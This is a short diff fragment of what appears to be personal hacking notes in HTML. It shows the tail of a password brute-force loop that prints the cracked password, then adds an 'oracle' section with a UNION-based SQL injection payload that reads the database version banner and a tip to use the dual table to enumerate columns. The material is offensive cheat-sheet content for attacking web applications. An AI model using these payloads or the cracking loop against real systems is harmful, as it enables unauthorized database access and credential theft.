@@ -99,3 +99,10 @@ while True:
       print("crackarooniedddddd")
       print('password is ' + keystr[:-1])
       break  </code></pre>
+
+
+<h2>oracle </h2>
+
+<code>1' UNION SELECT 'asd', banner FROM v$version--</code>
+
+<p>use table called dual to enum columns</p>
